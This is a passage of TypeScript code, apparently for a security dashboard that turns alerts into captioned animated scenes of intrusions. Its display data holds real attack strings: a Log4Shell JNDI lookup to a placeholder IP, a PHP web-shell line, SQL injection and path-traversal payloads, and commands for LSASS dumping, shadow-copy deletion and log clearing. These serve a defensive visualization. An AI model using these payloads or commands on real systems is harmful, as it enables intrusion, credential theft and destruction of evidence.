      template: 'processInjection',
      title: t('liveOps.titlePi', { injector, victim }),
      duration: 10500,
      parties: [host],
      captions,
      facts: { injector, victim },
    }
  },

  credDump(a, t) {
    const host = internalSide('host', a.target?.host ? a.target : a.adversary, a.dataSource)
    const n = (a.name ?? '').toLowerCase()
    const store = n.includes('lsass') ? 'LSASS memory' : n.includes('sam') ? 'SAM registry' : n.includes('ntds') ? 'NTDS.dit' : n.includes('keychain') ? 'Keychain' : n.includes('shadow') ? '/etc/shadow' : 'Credential store'
    const count = hashNum(a.id, 40, 300)
    const captions: Caption[] = [
      { at: 0, text: t('liveOps.capCd0', { host: host.name }) },
      { at: 2400, text: t('liveOps.capCd1', { store }) },
      { at: 5200, text: t('liveOps.capCd2', { n: count }) },
      { at: 8400, text: `${t('liveOps.capAlertRaised', { name: a.name ?? '' })}${t('liveOps.capCd3')}` },
    ]
    return {
      template: 'credDump',
      title: t('liveOps.titleCd', { store, host: host.name }),
      duration: 10500,
      parties: [host],
      captions,
      facts: { store, count },
    }
  },

  dataDestruction(a, t) {
    const host = internalSide('host', a.target?.host ? a.target : a.adversary, a.dataSource)
    const items = hashNum(a.id, 6, 8)
    const captions: Caption[] = [
      { at: 0, text: t('liveOps.capDd0', { host: host.name }) },
      { at: 2600, text: t('liveOps.capDd1', { n: items }) },
      { at: 5600, text: t('liveOps.capDd2') },
      { at: 8600, text: `${t('liveOps.capAlertRaised', { name: a.name ?? '' })}${t('liveOps.capDd3')}` },
    ]
    return {
      template: 'dataDestruction',
      title: t('liveOps.titleDd', { host: host.name }),
      duration: 10500,
      parties: [host],
      captions,
      facts: { items },
    }
  },

  toolDownload(a, t) {
    const src = attackerParty(a.adversary)
    const tgt = internalSide('target', a.target, a.dataSource)
    const n = (a.name ?? '').toLowerCase()
    const tool = n.includes('powershell') ? 'tool.ps1' : n.includes('curl') || n.includes('wget') ? 'tool.sh' : 'payload.bin'
    const folder = '/tmp'
    const captions: Caption[] = [
      { at: 0, text: t('liveOps.capTd0', { src: src.name, to: tgt.name }) },
      { at: 2200, text: t('liveOps.capTd1', { folder: `${folder}/${tool}` }) },
      { at: 4600, text: t('liveOps.capTd2', { tool }) },
      { at: 8400, text: `${t('liveOps.capAlertRaised', { name: a.name ?? '' })}${t('liveOps.capTd3')}` },
    ]
    return {
      template: 'toolDownload',
      title: t('liveOps.titleTd', { src: src.name, to: tgt.name }),
      duration: 10500,
      parties: [src, tgt],
      captions,
      facts: { tool, folder },
    }
  },

  c2tunnel(a, t) {
    const src = internalSide('source', a.adversary, a.dataSource)
    const dstName = a.target?.domain ?? a.target?.ip ?? t('liveOps.destUnknown')
    const dst: Party = { id: 'destination', role: 'external', kind: 'skull', name: dstName, sub: a.target?.ip, ip: a.target?.ip }
    const n = (a.name ?? '').toLowerCase()
    const proto = n.includes('dns') ? 'DNS' : n.includes('icmp') ? 'ICMP' : n.includes('ssh') ? 'SSH' : n.includes('https') ? 'HTTPS' : 'TCP'
    const bytes = hashNum(a.id + 't', 400, 3200) * 1024
    const captions: Caption[] = [
      { at: 0, text: t('liveOps.capCt0', { src: src.name, to: dstName }) },
      { at: 1800, text: t('liveOps.capCt1', { proto }) },
      { at: 4800, text: t('liveOps.capCt2', { proto }) },
      { at: 8200, text: `${t('liveOps.capAlertRaised', { name: a.name ?? '' })}${t('liveOps.capCt3')}` },
    ]
    return {
      template: 'c2tunnel',
      title: t('liveOps.titleCt', { src: src.name, to: dstName, proto }),
      duration: 10500,
      parties: [src, dst],
      captions,
      facts: { proto, bytes },
    }
  },

  powershellAbuse(a, t) {
    const host = internalSide('host', a.target?.host ? a.target : a.adversary, a.dataSource)
    const n = (a.name ?? '').toLowerCase()
    const amsi = /amsi/.test(n)
    const encoded = 'JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAdAByAGkAbgBnAFMAYwByAGkAYgB0AEUAbgBnAGkAbgBl'
    const cmd = amsi ? 'powershell -enc … (AMSI off)' : 'powershell -enc …'
    const captions: Caption[] = [
      { at: 0, text: t('liveOps.capPs0', { host: host.name }) },
      { at: 2200, text: t('liveOps.capPs1') },
      { at: 4800, text: amsi ? t('liveOps.capPs2a') : t('liveOps.capPs2') },
      { at: 8200, text: `${t('liveOps.capAlertRaised', { name: a.name ?? '' })}${t('liveOps.capPs3')}` },
    ]
    return {
      template: 'powershellAbuse',
      title: t('liveOps.titlePs2', { host: host.name }),
      duration: 10400,
      parties: [host],
      captions,
      facts: { encoded, cmd, amsi },
    }
  },

  iocMatch(a, t) {
    // For threat-feed hits the known-bad address is on `adversary`, the internal host on `target`.
    const ioc = a.adversary?.domain ?? a.adversary?.ip ?? a.target?.domain ?? a.target?.ip ?? 'known bad address'
    const src = internalSide('source', a.target, a.dataSource)
    const n = (a.name ?? '').toLowerCase()
    const kind = n.includes('domain') ? 'a known-bad domain' : n.includes('ip') ? 'a known-bad IP' : 'a known threat indicator'
    const dst: Party = { id: 'destination', role: 'external', kind: 'skull', name: ioc, sub: a.adversary?.geolocation?.country ?? 'Threat feed hit', ip: a.adversary?.ip ?? a.target?.ip, flag: a.adversary?.geolocation?.countryCode ? flagEmoji(a.adversary.geolocation.countryCode) : undefined }
    const captions: Caption[] = [
      { at: 0, text: t('liveOps.capIoc0', { src: src.name, ioc }) },
      { at: 2000, text: t('liveOps.capIoc1', { kind }) },
      { at: 4200, text: t('liveOps.capIoc2', { ioc }) },
      { at: 7800, text: `${t('liveOps.capAlertRaised', { name: a.name ?? '' })}${t('liveOps.capIoc3', { ioc })}` },
    ]
    return {
      template: 'iocMatch',
      title: t('liveOps.titleIoc', { src: src.name, ioc }),
      duration: 10200,
      parties: [src, dst],
      captions,
      facts: { ioc, kind },
    }
  },

  perimeterDetect(a, t) {
    const attacker = attackerParty(a.adversary)
    const fw = perimeterParty(a) ?? { id: 'perimeter', role: 'perimeter' as const, kind: 'firewall' as const, name: a.dataSource ?? 'perimeter device' }
    const n = (a.name ?? '').toLowerCase()
    const blocked = /block|dropped|detenido|bloqueada|bloqueado/.test(n) || (a.events ?? []).some((e) => (e as Ev).actionResult === 'blocked' || (e as Ev).action === 'blocked')
    const sig = n.includes('xss') ? 'XSS payload' : n.includes('sqli') || n.includes('injection') || n.includes('inyección') ? 'SQL injection payload' : n.includes('scan') || n.includes('sondeo') ? 'scanner probe' : n.includes('botnet') ? 'botnet callback' : 'IPS signature hit'
    const hits = hashNum(a.id, 12, 240)
    const captions: Caption[] = [
      { at: 0, text: t('liveOps.capPd0', { name: attacker.name, sig }) },
      { at: 2800, text: t('liveOps.capPd1', { fw: fw.name, sig }) },
      { at: 5600, text: blocked ? t('liveOps.capPd2') : t('liveOps.capPd3', { fw: fw.name }) },
      { at: 8000, text: `${t('liveOps.capAlertRaised', { name: a.name ?? '' })}${t('liveOps.capPd4', { name: attacker.name })}` },
    ]
    return {
      template: 'perimeterDetect',
      title: t('liveOps.titlePd', { sig, fw: fw.name }),
      duration: 10200,
      parties: [attacker, fw],
      captions,
      facts: { sig, blocked, hits },
    }
  },

  accountChange(a, t) {
    const host = internalSide('host', a.target?.host ? a.target : a.adversary, a.dataSource)
    const n = (a.name ?? '').toLowerCase()
    const who = a.adversary?.user ?? 'an admin session'
    let what = 'an account setting'
    let before = 'Normal state'
    let after = 'Changed'
    if (/privileged group|administrators group|security group|group policy/i.test(n)) { what = 'group membership'; before = 'Standard member'; after = 'Privileged group member' }
    else if (/new user account|account (created|added)/i.test(n)) { what = 'the account list'; before = `Accounts: unchanged`; after = `New account: ${a.target?.user ?? who}` }
    else if (/builtin administrator|guest account/i.test(n)) { what = 'the built-in accounts'; before = 'Disabled'; after = 'Enabled' }
    else if (/directory services restore|dsrm|password set/i.test(n)) { what = 'the DC recovery password'; before = 'Rotated, unknown'; after = 'Reset to attacker-known value' }
    else if (/lockout|kerberos policy|account policy/i.test(n)) { what = 'domain auth policy'; before = 'Standard thresholds'; after = 'Weakened thresholds' }
    else if (/se.*privilege/i.test(n)) { what = 'a system privilege'; before = 'Default assignment'; after = 'Extra privilege granted' }
    else if (/firewall rule/i.test(n)) { what = 'the host firewall ruleset'; before = 'Default deny inbound'; after = 'New rule added' }
    else { what = 'an account setting'; before = 'Protected'; after = 'Weakened' }
    const captions: Caption[] = [
      { at: 0, text: t('liveOps.capAc0', { host: host.name, who }) },
      { at: 2600, text: t('liveOps.capAc1', { what }) },
      { at: 5400, text: t('liveOps.capAc2', { before, after }) },
      { at: 8000, text: `${t('liveOps.capAlertRaised', { name: a.name ?? '' })}${t('liveOps.capAc3', { who })}` },
    ]
    return {
      template: 'accountChange',
      title: t('liveOps.titleAc', { what, host: host.name }),
      duration: 10200,
      parties: [host],
      captions,
      facts: { what, before, after },
    }
  },

  kerberosTicket(a, t) {
    const src = internalSide('source', a.adversary, a.dataSource)
    const dc: Party = { id: 'dc', role: 'internal', kind: 'dc', name: a.target?.host ?? 'domain controller', sub: a.target?.ip }
    const n = (a.name ?? '').toLowerCase()
    const kind = n.includes('golden') ? 'forged from a stolen krbtgt' : n.includes('silver') || n.includes('certificate') ? 'forged service ticket' : n.includes('as-rep') ? 'reply without pre-auth' : 'stolen service ticket'
    const ticket = n.includes('golden') ? 'krbtgt ticket' : n.includes('as-rep') ? 'AS-REP hash' : 'service ticket'
    const services = ['cifs$', 'mssql$', 'www$']
    const captions: Caption[] = [
      { at: 0, text: t('liveOps.capKb0', { src: src.name, dc: dc.name }) },
      { at: 2800, text: t('liveOps.capKb1', { kind, ticket }) },
      { at: 5400, text: t('liveOps.capKb2', { services: services.join(', ') }) },
      { at: 8200, text: `${t('liveOps.capAlertRaised', { name: a.name ?? '' })}${t('liveOps.capKb3')}` },
    ]
    return {
      template: 'kerberosTicket',
      title: t('liveOps.titleKb', { src: src.name, dc: dc.name }),
      duration: 10600,
      parties: [src, dc],
      captions,
      facts: { ticket, kind, services },
    }
  },

  reverseShell(a, t) {
    const attacker = attackerParty(a.adversary)
    const host = internalSide('target', a.target, a.dataSource)
    const n = (a.name ?? '').toLowerCase()
    const port = Number(evLog((a.events ?? [])[0] as Ev).dstPort ?? (n.includes('named pipe') ? 4444 : 4444))
    const captions: Caption[] = [
      { at: 0, text: t('liveOps.capRs0', { host: host.name }) },
      { at: 2000, text: t('liveOps.capRs1', { port, name: attacker.name }) },
      { at: 4400, text: t('liveOps.capRs2') },
      { at: 8200, text: `${t('liveOps.capAlertRaised', { name: a.name ?? '' })}${t('liveOps.capRs3', { host: host.name })}` },
    ]
    return {
      template: 'reverseShell',
      title: t('liveOps.titleRs', { host: host.name }),
      duration: 10400,
      parties: [attacker, host],
      captions,
      facts: { port },
    }
  },

  vmEscape(a, t) {
    const host = internalSide('host', a.target?.host ? a.target : a.adversary, a.dataSource)
    const guest = a.target?.host ?? a.adversary?.host ?? 'guest-vm'
    const captions: Caption[] = [
      { at: 0, text: t('liveOps.capVm0', { guest }) },
      { at: 2800, text: t('liveOps.capVm1') },
      { at: 5600, text: t('liveOps.capVm2', { host: host.name }) },
      { at: 8200, text: `${t('liveOps.capAlertRaised', { name: a.name ?? '' })}${t('liveOps.capVm3')}` },
    ]
    return {
      template: 'vmEscape',
      title: t('liveOps.titleVm', { guest, host: host.name }),
      duration: 10400,
      parties: [host],
      captions,
      facts: { guest },
    }
  },

  generic(a, t) {
    const src = a.adversary?.ip && !isInternalIp(a.adversary.ip) ? attackerParty(a.adversary) : internalSide('source', a.adversary, a.dataSource)
    const tgt = internalSide('target', a.target, a.dataSource)
    return {
      template: 'generic',
      title: a.name ?? t('liveOps.titleAlert'),
      duration: 9000,
      parties: [src, tgt],
      captions: [
        { at: 0, text: t('liveOps.capGen0', { src: src.name, tgt: tgt.name }) },
        { at: 3500, text: a.technique || a.category || t('liveOps.capGenNew') },
        { at: 6500, text: t('liveOps.capGen2', { name: a.name ?? '' }) },
      ],
      facts: {},
    }
  },
}

/* ─── Template details taken from the alert's events ────────────────── */

export interface ProcStep {
  name: string
  detail?: string
  bad?: boolean
}

function processChain(a: Alert, t: (k: string, o?: Record<string, unknown>) => string): ProcStep[] {
  const steps: ProcStep[] = []
  for (const e of (a.events ?? []) as Ev[]) {
    const l = evLog(e)
    const parent = baseName(l.eventDataParentProcessName)
    const child = baseName(l.eventDataNewProcessName)
    if (parent && !steps.some((s) => s.name.toLowerCase() === parent.toLowerCase())) steps.push({ name: parent })
    if (child && !steps.some((s) => s.name.toLowerCase() === child.toLowerCase())) steps.push({ name: child, detail: String(l.eventDataCommandLine ?? '') || undefined })
    if (l.eventDataScriptBlockText && !steps.some((s) => s.name === 'powershell.exe')) steps.push({ name: 'powershell.exe', detail: String(l.eventDataScriptBlockText) })
  }
  const n = (a.name ?? '').toLowerCase()
  const fallback: ProcStep[] =
    n.includes('lsass') ? [{ name: 'explorer.exe' }, { name: 'rundll32.exe' }, { name: 'comsvcs.dll MiniDump', detail: t('liveOps.dLsass') }]
    : n.includes('miner') ? [{ name: 'containerd-shim' }, { name: 'sh -c' }, { name: 'xmrig', detail: t('liveOps.dMiner') }]
    : n.includes('reverse shell') ? [{ name: 'nginx' }, { name: 'sh' }, { name: 'bash -i', detail: t('liveOps.dRev') }]
    : n.includes('keychain') ? [{ name: 'Terminal' }, { name: 'zsh' }, { name: 'security dump-keychain', detail: t('liveOps.dKey') }]
    : n.includes('scheduled task') ? [{ name: 'cmd.exe' }, { name: 'schtasks.exe /create', detail: t('liveOps.dTask') }]
    : n.includes('audit log') ? [{ name: 'mmc.exe' }, { name: 'wevtutil.exe cl Security', detail: t('liveOps.dAudit') }]
    : n.includes('firewall') ? [{ name: 'cmd.exe' }, { name: 'netsh advfirewall', detail: t('liveOps.dFw') }]
    : n.includes('shadow') ? [{ name: 'svchost.exe' }, { name: 'vssadmin delete shadows', detail: t('liveOps.dShadow') }]
    : n.includes('credential dumping') ? [{ name: 'cmd.exe' }, { name: 'procdump.exe', detail: t('liveOps.dDump') }]
    : n.includes('downloaded') || n.includes('ingress') ? [{ name: 'bash' }, { name: 'curl', detail: t('liveOps.dDl') }]
    : [{ name: 'explorer.exe' }, { name: 'cmd.exe' }, { name: 'powershell.exe', detail: t('liveOps.dPs') }]
  const chain = steps.length >= 2 ? steps : fallback
  const out = chain.slice(-4)
  out[out.length - 1] = { ...out[out.length - 1], bad: true }
  if (!out[out.length - 1].detail) out[out.length - 1].detail = fallback[fallback.length - 1].detail
  return out
}

export interface Payload {
  label: string
  status: number
}

function webPayloads(a: Alert): Payload[] {
  const n = (a.name ?? '').toLowerCase()
  const blocked = (a.events ?? []).some((e) => {
    const x = e as Ev
    return x.actionResult === 'blocked' || x.action === 'blocked'
  })
  const s = (ok: number) => (blocked ? 403 : ok)
  if (n.includes('hack tool')) {
    return [
      { label: 'User-Agent: sqlmap/1.8', status: s(404) },
      { label: "id=1' OR '1'='1", status: s(500) },
      { label: 'User-Agent: Nikto/2.5', status: s(404) },
      { label: '/.git/config', status: s(404) },
      { label: '/wp-login.php', status: s(404) },
      { label: '/api/v1/users?id=1 UNION SELECT', status: s(200) },
    ]
  }
  if (n.includes('spyware') || n.includes('vulnerability')) {
    return [
      { label: '${jndi:ldap://203.0.113.9/a}', status: s(400) },
      { label: '/cgi-bin/;id', status: s(404) },
      { label: 'Apache Struts OGNL', status: s(500) },
      { label: '/../../../../etc/passwd', status: s(404) },
    ]
  }
  return [
    { label: '/../../../../etc/passwd', status: s(404) },
    { label: '${jndi:ldap://203.0.113.9/x}', status: s(400) },
    { label: '<?php system($_GET[c]); ?>', status: s(403) },
    { label: "' OR 1=1 --", status: s(500) },
    { label: '/admin/config.php?cmd=id', status: s(200) },
  ]
}

function cloudChange(a: Alert): { what: string; before: string; after: string; risk: string } {
  const n = (a.name ?? '').toLowerCase()
  if (n.includes('cloudtrail')) return { what: 'CloudTrail logging', before: 'Logging on', after: 'Logging off', risk: 'every later action in AWS would go unrecorded.' }
  if (n.includes('security group')) return { what: 'a security group', before: 'Restricted to trusted networks', after: 'Open to 0.0.0.0/0', risk: 'the servers are reachable from the whole internet.' }
  if (n.includes('root account')) return { what: 'the root account session', before: 'MFA required', after: 'Root signed in without MFA', risk: 'the most powerful account is in use without a second factor.' }
  if (n.includes('mfa device')) return { what: 'an MFA device', before: 'MFA on', after: 'MFA removed', risk: 'the account is now protected by its password alone.' }
  if (n.includes('unusual api')) return { what: 'IAM permissions', before: 'A normal call rate', after: 'API calls at speed', risk: 'someone is mapping and changing permissions.' }
  if (n.includes('gcp iam')) return { what: 'project permissions', before: 'Viewer', after: 'Owner', risk: 'an account can now do anything in the project.' }
  if (n.includes('public')) return { what: 'a repository', before: 'Private', after: 'Public', risk: 'the source code is visible to anyone.' }
  if (n.includes('mass repository')) return { what: 'repository access', before: 'A few clones a day', after: 'Many repositories cloned in minutes', risk: 'the code base may be leaving the company.' }
  if (n.includes('secret scanning') || n.includes('secret')) return { what: 'a commit', before: 'No secrets in code', after: 'A credential committed', risk: 'a working credential is exposed in the repository.' }
  if (n.includes('forwarding') || n.includes('inbox rule')) return { what: 'mailbox rules', before: 'No forwarding', after: 'Forward all mail outside', risk: 'every incoming email is copied to an outside address.' }
  if (n.includes('transport')) return { what: 'a transport rule', before: 'Normal mail flow', after: 'Mail copied to external', risk: 'company-wide mail is redirected.' }
  if (n.includes('sharing')) return { what: 'file sharing', before: 'Internal only', after: 'Shared with an outside address', risk: 'internal files left the company.' }
  if (n.includes('admin login')) return { what: 'the admin session', before: 'Admins from the management network', after: 'Admin login from an unusual machine', risk: 'the device is being managed from an unusual host.' }
  return { what: 'a security setting', before: 'Protected', after: 'Weakened', risk: 'a risky change that needs review.' }
}

function distanceKm(lat1: number, lon1: number, lat2: number, lon2: number) {
  const r = (d: number) => (d * Math.PI) / 180
  const dLat = r(lat2 - lat1)
  const dLon = r(lon2 - lon1)
  const h = Math.sin(dLat / 2) ** 2 + Math.cos(r(lat1)) * Math.cos(r(lat2)) * Math.sin(dLon / 2) ** 2
  return 6371 * 2 * Math.asin(Math.sqrt(h))
}
